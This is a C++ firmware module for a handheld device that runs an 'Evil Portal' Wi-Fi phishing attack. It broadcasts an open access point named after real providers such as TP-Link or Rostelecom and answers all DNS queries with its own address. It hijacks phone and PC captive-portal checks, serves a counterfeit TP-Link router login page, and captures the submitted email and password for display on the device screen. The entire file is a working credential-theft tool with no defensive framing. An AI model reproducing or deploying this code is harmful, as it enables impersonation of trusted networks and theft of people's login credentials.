#include "attack_evil_portal.h"
#include "wifi_attacks_common.h"
#include "ui/keyboard.h"
#include <WiFi.h>
#include <WebServer.h>
#include <WiFiUdp.h>

namespace attack_evil_portal {

using namespace wifi_attacks_common;

enum EvilState : uint8_t {
  STATE_SSID_SEL = 0,
  STATE_CUSTOM_SSID,
  STATE_RUNNING
};

static EvilState s_state = STATE_SSID_SEL;

static const char* const kEvilPresets[] = {
  "TP-Link_2.4GHz",
  "Keenetic-Home",
  "ASUS_WiFi",
  "Free_WiFi",
  "Rostelecom_WiFi"
};
static const int kEvilPresetCount = sizeof(kEvilPresets) / sizeof(kEvilPresets[0]);

static int    s_evilSel          = 0;
static float  s_evilBarY         = (float)kStartY;
static float  s_evilScroll       = 0.0f;
static float  s_evilTargetScroll = 0.0f;
static char   s_evilCustomSsid[33] = "";
static char   s_evilActiveSsid[33] = "";
static int    s_evilClients      = 0;
static char   s_evilEmail[64]    = "";
static char   s_evilPassword[64] = "";
static bool   s_evilGotCreds     = false;

static WiFiUDP     s_dnsUdp;
static bool        s_dnsRunning = false;
static WebServer*  s_http       = nullptr;

static void dnsStart() {
  s_dnsUdp.begin(53);
  s_dnsRunning = true;
}

static void dnsStop() {
  if (s_dnsRunning) {
    s_dnsUdp.stop();
    s_dnsRunning = false;
  }
}

static void dnsProcess() {
  if (!s_dnsRunning) return;
  for (int p = 0; p < 8; p++) {
    int packetSize = s_dnsUdp.parsePacket();
    if (packetSize < 12) break;

    uint8_t req[512];
    int len = s_dnsUdp.read(req, sizeof(req));
    if (len < 12) continue;

    if ((req[2] & 0x80) != 0) continue;

    int qEnd = 12;
    while (qEnd < len && req[qEnd] != 0) {
      qEnd += req[qEnd] + 1;
    }
    qEnd += 1 + 4;
    if (qEnd > len) continue;

    uint8_t resp[512];
    memcpy(resp, req, qEnd);

    resp[2] = 0x81;
    resp[3] = 0x80;
    resp[4] = 0x00; resp[5] = 0x01;
    resp[6] = 0x00; resp[7] = 0x01;
    resp[8] = 0x00; resp[9] = 0x00;
    resp[10] = 0x00; resp[11] = 0x00;

    int rLen = qEnd;
    resp[rLen++] = 0xC0; resp[rLen++] = 0x0C;
    resp[rLen++] = 0x00; resp[rLen++] = 0x01;
    resp[rLen++] = 0x00; resp[rLen++] = 0x01;
    resp[rLen++] = 0x00; resp[rLen++] = 0x00; resp[rLen++] = 0x00; resp[rLen++] = 0x3C;
    resp[rLen++] = 0x00; resp[rLen++] = 0x04;
    resp[rLen++] = 192;  resp[rLen++] = 168;  resp[rLen++] = 4;    resp[rLen++] = 1;

    s_dnsUdp.beginPacket(s_dnsUdp.remoteIP(), s_dnsUdp.remotePort());
    s_dnsUdp.write(resp, rLen);
    s_dnsUdp.endPacket();
  }
}

static const char TPLINK_HTML[] PROGMEM = R"rawhtml(<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TP-Link | Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f5f5f5;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);width:340px;padding:40px 32px}
.logo{text-align:center;margin-bottom:28px}
.logo span{font-size:28px;font-weight:700;color:#00a0e9}
h2{text-align:center;color:#333;font-size:18px;margin-bottom:24px}
label{display:block;color:#555;font-size:13px;margin-bottom:4px}
input{width:100%;border:1px solid #ccc;border-radius:3px;padding:9px 12px;font-size:14px;margin-bottom:16px;outline:none}
input:focus{border-color:#00a0e9}
button{width:100%;background:#00a0e9;color:#fff;border:none;border-radius:3px;padding:11px;font-size:15px;cursor:pointer}
button:hover{background:#0080c0}
.note{text-align:center;color:#999;font-size:11px;margin-top:14px}
</style>
</head>
<body>
<div class="box">
  <div class="logo"><span>TP-LINK</span></div>
  <h2>Router Login</h2>
  <form method="POST" action="/login">
    <label>Email / Username</label>
    <input type="text" name="email" placeholder="admin" autocomplete="off">
    <label>Password</label>
    <input type="password" name="pass" placeholder="••••••••">
    <button type="submit">Log In</button>
  </form>
  <p class="note">TP-Link Smart Home Network</p>
</div>
</body>
</html>)rawhtml";

static const char TPLINK_SUCCESS_HTML[] PROGMEM = R"rawhtml(<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>TP-Link</title>
<style>body{font-family:Arial,sans-serif;text-align:center;padding-top:80px;background:#f5f5f5}
.box{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);display:inline-block;padding:40px 48px}
span{font-size:28px;font-weight:700;color:#00a0e9}h2{color:#333;margin-top:16px}</style>
</head><body><div class="box"><span>TP-LINK</span><h2>Authenticating...<br>Please wait</h2></div></body></html>)rawhtml";

static void evilPortalStart() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(
    IPAddress(192,168,4,1),
    IPAddress(192,168,4,1),
    IPAddress(255,255,255,0)
  );
  WiFi.softAP(s_evilActiveSsid, "", 6, 0, 4);

  if (!s_http) s_http = new WebServer(80);
  dnsStart();

  auto servePage = [&]() {
    s_http->sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    s_http->sendHeader("Pragma", "no-cache");
    s_http->sendHeader("Expires", "-1");
    s_http->send_P(200, "text/html", TPLINK_HTML);
  };
  s_http->on("/", HTTP_GET, servePage);
  s_http->on("/login", HTTP_GET, servePage);
  s_http->on("/index.html", HTTP_GET, servePage);

  auto redirectCaptive = [&]() {
    s_http->sendHeader("Location", "http://192.168.4.1/redirect", true);
    s_http->send(302, "text/plain", "");
  };

  s_http->on("/connecttest.txt",     HTTP_GET, redirectCaptive);
  s_http->on("/ncsi.txt",            HTTP_GET, redirectCaptive);
  s_http->on("/generate_204",        HTTP_GET, redirectCaptive);
  s_http->on("/gen_204",             HTTP_GET, redirectCaptive);

  s_http->on("/redirect",            HTTP_GET, servePage);
  s_http->on("/hotspot-detect.html", HTTP_GET, servePage);
  s_http->on("/canonical.html",      HTTP_GET, servePage);
  s_http->on("/success.txt",         HTTP_GET, servePage);

  s_http->onNotFound(servePage);

  s_http->on("/login", HTTP_POST, [](){
    if (s_http->hasArg("email"))    strncpy(s_evilEmail,    s_http->arg("email").c_str(), 63);
    if (s_http->hasArg("pass"))     strncpy(s_evilPassword, s_http->arg("pass").c_str(),  63);
    s_evilGotCreds = true;
    s_http->send_P(200, "text/html", TPLINK_SUCCESS_HTML);
  });

  s_http->begin();
  s_evilClients = 0;
}

static void evilPortalStop() {
  if (s_http) { s_http->stop(); delete s_http; s_http = nullptr; }
  dnsStop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
}

void open() {
  s_state = STATE_SSID_SEL;
  s_evilSel = 0;
  s_evilBarY = (float)kStartY;
  s_evilScroll = 0.0f;
  s_evilTargetScroll = 0.0f;
  s_evilGotCreds = false;
  s_evilEmail[0] = '\0';
  s_evilPassword[0] = '\0';
}

void close() {
  if (s_state == STATE_RUNNING) {
    evilPortalStop();
  }
  s_state = STATE_SSID_SEL;
}

void tick(uint32_t now) {
  if (s_state == STATE_SSID_SEL) {
    updateScroll(s_evilSel, kEvilPresetCount + 1, s_evilScroll, s_evilTargetScroll, s_evilBarY);
  } else if (s_state == STATE_CUSTOM_SSID) {
    ui_keyboard::tick(now);
  } else if (s_state == STATE_RUNNING) {
    dnsProcess();
    if (s_http) s_http->handleClient();
    s_evilClients = WiFi.softAPgetStationNum();
  }
}

void onKey(const KeyEvent& ev) {
  if (ev.repeat) return;

  if (s_state == STATE_SSID_SEL) {
    const int totalItems = kEvilPresetCount + 1;
    if (ev.key == BTN_UP) {
      s_evilSel = (s_evilSel - 1 + totalItems) % totalItems;
    } else if (ev.key == BTN_DOWN) {
      s_evilSel = (s_evilSel + 1) % totalItems;
    } else if (ev.key == BTN_OK) {
      if (s_evilSel == kEvilPresetCount) {
        ui_keyboard::open("SSID", s_evilCustomSsid, [](const String& text, bool ok) {
          if (ok && text.length() > 0) {
            strncpy(s_evilCustomSsid, text.c_str(), 32);
            s_evilCustomSsid[32] = '\0';
            strncpy(s_evilActiveSsid, s_evilCustomSsid, 32);
          }
          s_state = ok && strlen(s_evilActiveSsid) > 0
                    ? STATE_RUNNING
                    : STATE_SSID_SEL;
          if (s_state == STATE_RUNNING) evilPortalStart();
        });
        s_state = STATE_CUSTOM_SSID;
      } else {
        strncpy(s_evilActiveSsid, kEvilPresets[s_evilSel], 32);
        s_evilActiveSsid[32] = '\0';
        evilPortalStart();
        s_state = STATE_RUNNING;
      }
    }
  } else if (s_state == STATE_CUSTOM_SSID) {
    auto r = ui_keyboard::onKey(ev);
    if (r == ui_keyboard::CANCEL) {
      s_state = STATE_SSID_SEL;
    }
  }
}

bool onBack() {
  if (s_state == STATE_RUNNING) {
    evilPortalStop();
    s_state = STATE_SSID_SEL;
    return true;
  } else if (s_state == STATE_CUSTOM_SSID) {
    ui_keyboard::close();
    s_state = STATE_SSID_SEL;
    return true;
  } else if (s_state == STATE_SSID_SEL) {
    return false;
  }
  return false;
}

void draw(U8G2& u8g2, uint32_t now) {
  if (s_state == STATE_SSID_SEL) {
    drawHeader(u8g2, "EVIL PORTAL");
    u8g2.setClipWindow(0, 14, 128, 64);

    const int totalItems = kEvilPresetCount + 1;
    u8g2.setFont(u8g2_font_6x12_tr);
    for (int i = 0; i < totalItems; i++) {
      int y = kStartY + (int)(i * kRowH - s_evilScroll + 0.5f);
      if (y < kStartY - kRowH || y > 64) continue;
      const char* label = (i < kEvilPresetCount) ? kEvilPresets[i] : "Custom SSID";
      u8g2.drawStr(6, y + 10, label);
    }
    u8g2.setDrawColor(2);
    int curY = (int)(s_evilBarY + 0.5f);
    if (curY < kStartY) curY = kStartY;
    if (curY > 64 - kRowH) curY = 64 - kRowH;
    u8g2.drawBox(2, curY, 124, kRowH);
    u8g2.setDrawColor(1);

    u8g2.setMaxClipWindow();
    return;
  }

  if (s_state == STATE_CUSTOM_SSID) {
    ui_keyboard::draw(u8g2, now);
    return;
  }

  if (s_state == STATE_RUNNING) {
    drawHeader(u8g2, "EVIL PORTAL");
    u8g2.setFont(u8g2_font_5x8_tr);

    char buf[40];
    snprintf(buf, sizeof(buf), "SSID: %s", s_evilActiveSsid);
    u8g2.drawStr(2, 23, buf);

    u8g2.drawStr(2, 33, "Evil Portal: STARTED");

    snprintf(buf, sizeof(buf), "Clients: %d", s_evilClients);
    u8g2.drawStr(2, 43, buf);

    u8g2.drawHLine(2, 46, 124);

    u8g2.setFont(u8g2_font_5x8_tr);
    if (s_evilGotCreds) {
      char ebuf[24], pbuf[24];
      snprintf(ebuf, sizeof(ebuf), "email: %.18s", s_evilEmail);
      snprintf(pbuf, sizeof(pbuf), "pass:  %.18s", s_evilPassword);
      u8g2.drawStr(2, 54, ebuf);
      u8g2.drawStr(2, 63, pbuf);
    } else {
      u8g2.drawStr(2, 54, "email: ---");
      u8g2.drawStr(2, 63, "pass:  ---");
    }
    return;
  }
}

}
